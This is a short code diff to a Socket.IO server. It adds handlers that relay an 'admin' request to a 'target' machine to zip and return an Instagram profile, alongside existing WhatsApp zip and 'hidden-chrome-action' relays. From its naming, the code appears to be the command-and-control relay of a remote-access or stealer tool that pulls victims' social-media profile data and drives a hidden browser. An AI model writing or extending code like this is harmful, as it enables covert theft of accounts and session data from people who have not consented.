@@ -117,6 +117,23 @@ io.on('connection', (socket) => {
     io.to(data.adminId).emit('whatsapp-zip-error', data);
   });
 
+  // Zip Profile Instagram
+  socket.on('request-zip-instagram', (data) => {
+    if (typeof data === 'string') {
+        io.to(data).emit('request-zip-instagram', socket.id);
+    } else {
+        io.to(data.targetId).emit('request-zip-instagram', { adminId: socket.id, profileName: data.profileName });
+    }
+  });
+
+  socket.on('instagram-zip-ready', (data) => {
+    io.to(data.adminId).emit('instagram-zip-ready', data);
+  });
+
+  socket.on('instagram-zip-error', (data) => {
+    io.to(data.adminId).emit('instagram-zip-error', data);
+  });
+
   socket.on('hidden-chrome-action', (data) => {
     io.to(data.targetId).emit('hidden-chrome-action', data.action);
   });
